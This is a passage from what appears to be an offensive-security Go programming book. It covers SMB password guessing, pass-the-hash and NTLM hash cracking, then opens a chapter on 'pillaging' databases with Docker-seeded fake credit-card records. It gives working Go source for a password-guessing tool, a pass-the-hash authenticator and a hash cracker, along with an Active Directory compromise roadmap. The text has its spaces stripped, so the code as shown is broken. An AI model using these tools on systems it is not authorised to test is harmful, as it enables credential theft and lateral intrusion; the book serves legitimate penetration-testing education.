Port:445,
}
users:=bytes.Split(buf,[]byte{'\n'})
for_,user:=rangeusers❷{
❸options.User=string(user)
session,err:=smb.NewSession(options,false)❹
iferr!=nil{
fmt.Printf("[-]Loginfailed:%s\\%s[%s]\n",
options.Domain,
options.User,
options.Password)
continue
}
defersession.Close()
ifsession.IsAuthenticated❺{
fmt.Printf("[+]Success:%s\\%s[%s]\n",
options.Domain,
options.User,
options.Password)
}
}
}
Listing6-12:LeveragingtheSMBpackageforonlinepasswordguessing(/ch-
6/password-guessing/main.go)
TheSMBpackageoperatesonsessions.Toestablisha
session,youfirstinitializeansmb.Optionsinstancethatwill
containallyoursessionoptions,includingtargethost,user,
password,port,anddomain❶.Next,youloopthrougheach
ofyourtargetusers❷,settingtheoptions.Uservalue
appropriately❸,andissueacalltosmb.NewSession()❹.This
functiondoesalotofheavyliftingforyoubehindthescenes:
itnegotiatesboththeSMBdialectandauthentication
mechanism,andthenauthenticatestotheremotetarget.The
functionwillreturnanerrorifauthenticationfails,anda
booleanIsAuthenticatedfieldonthesessionstructispopulated
basedofftheoutcome.Itwillthencheckthevaluetosee
whethertheauthenticationsucceeded,andifitdid,displaya
successmessage❺.
Thatisallittakestocreateanonlinepassword-guessing
utility.
REUSINGPASSWORDSWITHTHE
PASS-THE-HASHTECHNIQUE
PASS-THE-HASHTECHNIQUE
Thepass-the-hashtechniqueallowsanattackertoperform
SMBauthenticationbyusingapassword’sNTLMhash,even
iftheattackerdoesn’thavethecleartextpassword.This
sectionwalksyouthroughtheconceptandshowsyouan
implementationofit.
Pass-the-hashisashortcuttoatypicalActiveDirectory
domaincompromise,atypeofattackinwhichattackersgain
aninitialfoothold,elevatetheirprivileges,andmovelaterally
throughoutthenetworkuntiltheyhavetheaccesslevelsthey
needtoachievetheirendgoal.ActiveDirectorydomain
compromisesgenerallyfollowtheroadmappresentedinthis
list,assumingtheytakeplacethroughanexploitratherthan
somethinglikepasswordguessing:
1. Theattackerexploitsthevulnerabilityandgainsafootholdonthenetwork.
2. Theattackerelevatesprivilegesonthecompromisedsystem.
3. TheattackerextractshashedorcleartextcredentialsfromLSASS.
4. Theattackerattemptstorecoverthelocaladministratorpasswordviaoffline
cracking.
5. Theattackerattemptstoauthenticatetoothermachinesbyusingthe
administratorcredentials,lookingforreuseofthepassword.
6. Theattackerrinsesandrepeatsuntilthedomainadministratororothertargethas
beencompromised.
WithNTLMSSPauthentication,however,evenifyoufail
torecoverthecleartextpasswordduringstep3or4,youcan
proceedtousethepassword’sNTLMhashforSMB
authenticationduringstep5—inotherwords,passingthehash.
Pass-the-hashworksbecauseitseparatesthehash
calculationfromthechallenge-responsetokencalculation.To
seewhythisis,let’slookatthefollowingtwofunctions,
definedbytheNTLMSSPspecification,pertainingtothe
cryptographicandsecuritymechanismsusedfor
authentication:
NTOWFv2AcryptographicfunctionthatcreatesanMD5
HMACbyusingtheusername,domain,andpassword
values.ItgeneratestheNTLMhashvalue.
ComputeResponseAfunctionthatusestheNTLMhashin
combinationwiththemessage’sclientandserver
challenges,timestamp,andtargetservernametoproducea
GSS-APIsecuritytokenthatcanbesentforauthentication.
Youcanseetheimplementationsofthesefunctionsin
Listing6-13.
funcNtowfv2(pass,user,domainstring)[]byte{
h:=hmac.New(md5.New,Ntowfv1(pass))
h.Write(encoder.ToUnicode(strings.ToUpper(user)+domain))
returnh.Sum(nil)
}
funcComputeResponseNTLMv2(nthash❶,lmhash,clientChallenge,
serverChallenge,timestamp,
serverName[]byte)[]byte{
temp:=[]byte{1,1}
temp=append(temp,0,0,0,0,0,0)
temp=append(temp,timestamp...)
temp=append(temp,clientChallenge...)
temp=append(temp,0,0,0,0)
temp=append(temp,serverName...)
temp=append(temp,0,0,0,0)
h:=hmac.New(md5.New,nthash)
h.Write(append(serverChallenge,temp...))
ntproof:=h.Sum(nil)
returnappend(ntproof,temp...)
}
Listing6-13:WorkingwithNTLMhashes(/ch-6/smb/ntlmssp/crypto.go)
TheNTLMhashissuppliedasinputtothe
ComputeResponseNTLMv2function❶,meaningthehashhasbeen
createdindependentlyofthelogicusedforsecuritytoken
creation.Thisimpliesthathashesstoredanywhere—evenin
LSASS—areconsideredprecalculated,becauseyoudon’t
needtosupplythedomain,user,orpasswordasinput.The
authenticationprocessisasfollows:
1. Calculatetheuser’shashbyusingthedomain,user,andpasswordvalues.
2. UsethehashasinputtocalculateauthenticationtokensforNTLMSSPover
SMB.
Sinceyoualreadyhaveahashinhand,you’vealready
completedstep1.Topassthehash,youinitiateyourSMB
authenticationsequence,asyoudefineditwaybackinthe
openingsectionsofthischapter.However,younevercalculate
thehash.Instead,youusethesuppliedvalueasthehashitself.
Listing6-14showsapass-the-hashutilitythatusesa
passwordhashtoattempttoauthenticateasaspecificusertoa
listofmachines.
funcmain(){
iflen(os.Args)!=5{
log.Fatalln("Usage:main")
}
buf,err:=ioutil.ReadFile(os.Args[1])
iferr!=nil{
log.Fatalln(err)
}
options:=smb.Options{
User:os.Args[2],
Domain:os.Args[3],
Hash❶:os.Args[4],
Port:445,
}
targets:=bytes.Split(buf,[]byte{'\n'})
for_,target:=rangetargets❷{
options.Host=string(target)
session,err:=smb.NewSession(options,false)
iferr!=nil{
fmt.Printf("[-]Loginfailed[%s]:%s\n",options.Host,err)
continue
}
defersession.Close()
ifsession.IsAuthenticated{
fmt.Printf("[+]Loginsuccessful[%s]\n",options.Host)
}
}
}
Listing6-14:Passingthehashforauthenticationtesting(/ch-6/password-
reuse/main.go)
Thiscodeshouldlooksimilartothepassword-guessing
example.Theonlysignificantdifferencesarethatyou’re
settingtheHashfieldofsmb.Options(notthePasswordfield)❶and
you’reiteratingoveralistoftargethosts(ratherthantarget
users)❷.Thelogicwithinthesmb.NewSession()functionwilluse
thehashvalueifpopulatedwithintheoptionsstruct.
RECOVERINGNTLMPASSWORDS
Insomeinstances,havingonlythepasswordhashwillbe
inadequateforyouroverallattackchain.Forexample,many
services(suchasRemoteDesktop,OutlookWebAccess,and
others)don’tallowhash-basedauthentication,becauseiteither
isn’tsupportedorisn’tadefaultconfiguration.Ifyourattack
chainrequiresaccesstooneoftheseservices,you’llneeda
cleartextpassword.Inthefollowingsections,you’llwalk
throughhowhashesarecalculatedandhowtocreateabasic
passwordcracker.
CalculatingtheHash
InListing6-15,youperformthemagicofcalculatingthehash.
funcNewAuthenticatePass(domain,user,workstation,passwordstring,c
Challenge)Authenticate
{
//Assumesdomain,user,andworkstationarenotunicode
nthash:=Ntowfv2(password,user,domain)
lmhash:=Lmowfv2(password,user,domain)
returnnewAuthenticate(domain,user,workstation,nthash,lmhash,c)
}
funcNewAuthenticateHash(domain,user,workstation,hashstring,cChallenge)
Authenticate{
//Assumesdomain,user,andworkstationarenotunicode
buf:=make([]byte,len(hash)/2)
hex.Decode(buf,[]byte(hash))
returnnewAuthenticate(domain,user,workstation,buf,buf,c)
}
Listing6-15:Calculatinghashes(/ch-6/smb/ntlmssp/ntlmssp.go)
Thelogictocalltheappropriatefunctionisdefined
elsewhere,butyou’llseethatthetwofunctionsaresimilar.
Therealdifferenceisthatpassword-basedauthenticationin
theNewAuthenticatePass()functioncomputesthehashbefore
generatingtheauthenticationmessage,whereasthe
NewAuthenticateHash()functionskipsthatstepandusesthe
suppliedhashdirectlyasinputtogeneratethemessage.
RecoveringtheNTLMHash
InListing6-16,youcanseeautilitythatrecoversapassword
bycrackingasuppliedNTLMhash.
funcmain(){
iflen(os.Args)!=5{
log.Fatalln("Usage:main")
}
hash:=make([]byte,len(os.Args[4])/2)
_,err:=hex.Decode(hash,[]byte(os.Args[4]))❶
iferr!=nil{
log.Fatalln(err)
}
f,err:=ioutil.ReadFile(os.Args[1])
iferr!=nil{
log.Fatalln(err)
}
varfoundstring
passwords:=bytes.Split(f,[]byte{'\n'})
for_,password:=rangepasswords❷{
h:=ntlmssp.Ntowfv2(string(password),os.Args[2],os.Args[3])❸
ifbytes.Equal(hash,h)❹{
found=string(password)
break
}
}
iffound!=""{
fmt.Printf("[+]Recoveredpassword:%s\n",found)
}else{
fmt.Println("[-]Failedtorecoverpassword")
}
}
Listing6-16:NTLMhashcracking(/ch-6/password-recovery/main.go)
Theutilityreadsthehashasacommandlineargument,
decodingittoa[]byte❶.Thenyouloopoverasupplied
passwordlist❷,calculatingthehashofeachentrybycalling
thentlmssp.Ntowfv2()functionwediscussedpreviously❸.
Finally,youcomparethecalculatedhashwiththatofour
suppliedvalue❹.Iftheymatch,youhaveahitandbreakout
oftheloop.
SUMMARY
You’vemadeitthroughadetailedexaminationofSMB,
touchingonprotocolspecifics,reflection,structurefieldtags,
andmixedencoding!Youalsolearnedhowpass-the-hash
works,aswellasafewusefulutilityprogramsthatleverage
theSMBpackage.
Tocontinueyourlearning,weencourageyoutoexplore
additionalSMBcommunications,particularlyinrelationto
remotecodeexecution,suchasPsExec.Usinganetwork
sniffer,suchasWireshark,capturethepacketsandevaluate
howthisfunctionalityworks.
Inthenextchapter,wemoveonfromnetworkprotocol
specificstofocusonattackingandpillagingdatabases.
7
ABUSINGDATABASESAND
FILESYSTEMS
Nowthatwe’vecoveredthemajorityofcommonnetwork
protocolsusedforactiveserviceinterrogation,commandand
control,andothermaliciousactivity,let’sswitchourfocusto
anequallyimportanttopic:datapillaging.
Althoughdatapillagingmaynotbeasexcitingasinitial
exploitation,lateralnetworkmovement,orprivilege
escalation,it’sacriticalaspectoftheoverallattackchain.
Afterall,weoftenneeddatainordertoperformthoseother
activities.Commonly,thedataisoftangibleworthtoan
attacker.Althoughhackinganorganizationisthrilling,the
dataitselfisoftenalucrativeprizefortheattackeranda
damninglossfortheorganization.
Dependingonwhichstudyyouread,abreachin2020can
costanorganizationapproximately$4to$7million.AnIBM
studyestimatesitcostsanorganization$129to$355per
recordstolen.Hell,ablackhathackercanmakesomeserious
coinofftheundergroundmarketbysellingcreditcardsata
rateof$7to$80percard
(http://online.wsj.com/public/resources/documents/securework
s_hacker_annualreport.pdf).
TheTargetbreachaloneresultedinacompromiseof40
millioncards.Insomecases,theTargetcardsweresoldforas
muchas$135percard(http://www.businessinsider.com/heres-
what-happened-to-your-target-data-that-was-hacked-2014-
10/).That’sprettylucrative.We,innoway,advocatethattype
ofactivity,butfolkswithaquestionablemoralcompassstand
tomakealotofmoneyfromdatapillaging.
Enoughabouttheindustryandfancyreferencestoonline
articles—let’spillage!Inthischapter,you’lllearntosetup
andseedavarietyofSQLandNoSQLdatabasesandlearnto
connectandinteractwiththosedatabasesviaGo.We’llalso
demonstratehowtocreateadatabaseandfilesystemdata
minerthatsearchesforkeyindicatorsofjuicyinformation.
SETTINGUPDATABASESWITH
DOCKER
Inthissection,you’llinstallvariousdatabasesystemsandthen
seedthemwiththedatayou’lluseinthischapter’spillaging
examples.Wherepossible,you’lluseDockeronanUbuntu
18.04VM.Dockerisasoftwarecontainerplatformthatmakes
iteasytodeployandmanageapplications.Youcanbundle
applicationsandtheirdependenciesinamannerthatmakes
theirdeploymentstraightforward.Thecontaineris
compartmentalizedfromtheoperatingsysteminorderto
preventthepollutionofthehostplatform.Thisisniftystuff.
Andforthischapter,youwilluseavarietyofprebuilt
Dockerimagesforthedatabasesyou’llbeworkingwith.If
youdon’thaveitalready,installDocker.YoucanfindUbuntu
instructionsathttps://docs.docker.com/install/linux/docker-
ce/ubuntu/.
NOTE
We’vespecificallychosentoomitdetailsonsettingupanOracleinstance.
AlthoughOracleprovidesVMimagesthatyoucandownloadanduseto
createatestdatabase,wefeltthatitwasunnecessarytowalkyouthrough
these steps, since they’re fairly similar to the MySQL examples below.
We’llleavetheOracle-specificimplementationasanexerciseforyoutodo
independently.
InstallingandSeedingMongoDB
MongoDBistheonlyNoSQLdatabasethatyou’lluseinthis
chapter.Unliketraditionalrelationaldatabases,MongoDB
doesn’tcommunicateviaSQL.Instead,MongoDBusesan
easy-to-understandJSONsyntaxforretrievingand
manipulatingdata.Entirebookshavebeendedicatedto
explainingMongoDB,andafullexplanationiscertainly
beyondthescopeofthisbook.Fornow,you’llinstallthe
Dockerimageandseeditwithfakedata.
UnliketraditionalSQLdatabases,MongoDBisschema-
less,whichmeansthatitdoesn’tfollowapredefined,rigid
rulesystemfororganizingtabledata.Thisexplainswhyyou’ll
seeonlyinsertcommandsinListing7-1withoutanyschema
definitions.First,installtheMongoDBDockerimagewiththe
followingcommand:
$dockerrun--namesome-mongo-p27017:27017mongo
Thiscommanddownloadstheimagenamedmongofromthe
Dockerrepository,spinsupanewinstancenamedsome-mongo
—thenameyougivetheinstanceisarbitrary—andmapslocal
port27017tothecontainerport27017.Theportmappingiskey,
asitallowsustoaccessthedatabaseinstancedirectlyfromour
operatingsystem.Withoutit,itwouldbeinaccessible.
Checkthatthecontainerstartedautomaticallybylistingall
therunningcontainers:
$dockerps
Intheeventyourcontainerdoesn’tstartautomatically,run
thefollowingcommand:
$dockerstartsome-mongo
Thestartcommandshouldgetthecontainergoing.
Onceyourcontainerstarts,connecttotheMongoDB
instancebyusingtheruncommand—passingittheMongoDB
client;thatway,youcaninteractwiththedatabasetoseed
data:
$dockerrun-it--linksome-mongo:mongo--rmmongosh\
-c'execmongo
"$MONGO_PORT_27017_TCP_ADDR:$MONGO_PORT_27017_TCP_POR
T/store"'
>
Thismagicalcommandrunsadisposable,secondDocker
containerthathastheMongoDBclientbinaryinstalled—so
youdon’thavetoinstallthebinaryonyourhostoperating
system—andusesittoconnecttothesome-mongoDocker
container’sMongoDBinstance.Inthisexample,you’re
connectingtoadatabasenamedtest.
InListing7-1,youinsertanarrayofdocumentsintothe
transactionscollection.(Allthecodelistingsattherootlocation
of/existundertheprovidedgithubrepo
https://github.com/blackhat-go/bhg/.)
>db.transactions.insert([
{
"ccnum":"4444333322221111",
"date":"2019-01-05",
"amount":100.12,
"cvv":"1234",
"exp":"09/2020"
},
{
"ccnum":"4444123456789012",
"date":"2019-01-07",
"amount":2400.18,
"cvv":"5544",
"exp":"02/2021"
},
{
"ccnum":"4465122334455667",
"date":"2019-01-29",
"amount":1450.87,
"cvv":"9876",
"exp":"06/2020"